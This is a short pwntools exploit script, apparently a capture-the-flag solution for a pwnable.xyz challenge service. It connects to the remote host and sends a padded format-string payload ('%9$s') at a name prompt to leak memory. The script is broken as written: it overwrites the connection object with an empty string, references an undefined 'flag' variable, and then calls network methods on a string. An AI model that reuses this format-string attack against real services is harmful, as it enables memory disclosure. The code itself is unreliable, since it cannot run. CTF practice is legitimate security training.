from pwn import *

p=remote("svc.pwnable.xyz",30004)

context.log_level='debug'

p = ''
p += 'Y'+'A'*7 + p32(flag)
p.sendlineafter("[y/N]: ", "yAAABBBB")
p.sendlineafter("Name: ", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%9$sAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

p.interactive()
p.close()